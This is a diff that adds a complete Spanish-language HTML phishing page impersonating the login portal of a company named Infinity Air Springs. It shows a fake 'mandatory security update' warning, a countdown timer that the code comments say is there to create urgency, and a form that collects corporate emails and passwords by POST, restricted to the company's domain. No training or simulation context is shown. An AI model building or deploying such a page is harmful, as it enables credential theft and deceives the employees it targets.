@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Seguro - Infinity Air Springs</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        .logo p {
+            color: #666;
+            font-size: 14px;
+        }
+        .security-notice {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .security-notice strong {
+            color: #856404;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #666;
+        }
+        .timer {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>🔒 Portal Seguro</h1>
+            <p>Infinity Air Springs</p>
+        </div>
+        
+        <div class="security-notice">
+            <strong>⚠️ Actualización de Seguridad Obligatoria</strong><br>
+            Ingresa tus credenciales para mantener el acceso
+        </div>
+        
+        <div class="timer" id="timer">
+            ⏰ Tiempo restante: <span id="countdown">23:59:59</span>
+        </div>
+        
+        <form method="POST" id="loginForm">
+            <div class="form-group">
+                <label for="username">👤 Usuario Corporativo</label>
+                <input type="text" id="username" name="username" required placeholder="tu.nombre@infinityairsprings.com">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">🔑 Contraseña Actual</label>
+                <input type="password" id="password" name="password" required placeholder="Ingresa tu contraseña">
+            </div>
+            
+            <button type="submit" class="btn">🔐 Verificar y Actualizar</button>
+        </form>
+        
+        <div class="footer">
+            <p>🛡️ Conexión segura SSL/TLS</p>
+            <p>© 2024 Infinity Air Springs - Sistema de Seguridad</p>
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer para crear urgencia
+        function startCountdown() {
+            let hours = 23, minutes = 59, seconds = 59;
+            
+            setInterval(function() {
+                seconds--;
+                if (seconds < 0) {
+                    seconds = 59;
+                    minutes--;
+                    if (minutes < 0) {
+                        minutes = 59;
+                        hours--;
+                    }
+                }
+                
+                document.getElementById('countdown').textContent = 
+                    String(hours).padStart(2, '0') + ':' + 
+                    String(minutes).padStart(2, '0') + ':' + 
+                    String(seconds).padStart(2, '0');
+            }, 1000);
+        }
+        
+        startCountdown();
+        
+        // Validación del formulario
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username.includes('@infinityairsprings.com')) {
+                alert('Por favor, usa tu email corporativo (@infinityairsprings.com)');
+                e.preventDefault();
+                return false;
+            }
+            
+            if (password.length < 1) {
+                alert('La contraseña es requerida');
+                e.preventDefault();
+                return false;
+            }
+        });
+    </script>
+</body>
+</html>
